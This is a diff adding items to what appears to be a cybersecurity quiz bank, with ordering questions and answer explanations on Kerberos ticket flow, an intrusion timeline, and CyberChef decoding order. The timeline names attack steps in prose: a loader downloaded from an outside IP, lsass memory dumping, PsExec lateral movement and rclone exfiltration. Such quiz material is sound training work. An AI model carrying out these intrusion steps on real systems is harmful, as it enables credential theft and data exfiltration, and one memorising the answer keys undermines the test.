+         steps: ["The client asks the KDC's authentication service for a ticket-granting ticket (AS-REQ)", "The KDC returns the ticket-granting ticket (AS-REP)", "The client presents the TGT and asks for a service ticket for the file server (TGS-REQ)", "The KDC returns the service ticket (TGS-REP)", "The client presents the service ticket to the file server (AP-REQ)"],
+         why: "Authentication yields a TGT, the TGT buys a service ticket, and the service ticket is shown to the server. Kerberoasting abuses the TGS step; golden tickets forge the TGT."}
+      - {id: cy-1z2-o05, type: order,
+         q: "An investigation recovers these events from one intrusion without timestamps. Put them in the order they must have happened.",
+         steps: ["winword.exe starts powershell.exe from an emailed document", "PowerShell downloads and runs a loader from 203.0.113.5", "rundll32.exe dumps lsass.exe memory on the workstation", "it-admin's credentials are used to install PSEXESVC on the file server", "rclone.exe uploads an archive of the file share to cloud storage"],
+         why: "Initial access leads to execution of a payload, which steals credentials, which allow lateral movement to the file server, where data is staged and exfiltrated."}
+      - {id: cy-1z2-o06, type: order,
+         q: "A payload was gzip-compressed, the result Base64-encoded, and the Base64 text then reversed. Put the CyberChef operations in the order that recovers the original.",
+         steps: ["Reverse", "From Base64", "Gunzip"],
+         why: "Decoding undoes the layers in the opposite order to how they were applied: the last step (reversing) is undone first and the first (compression) last."}
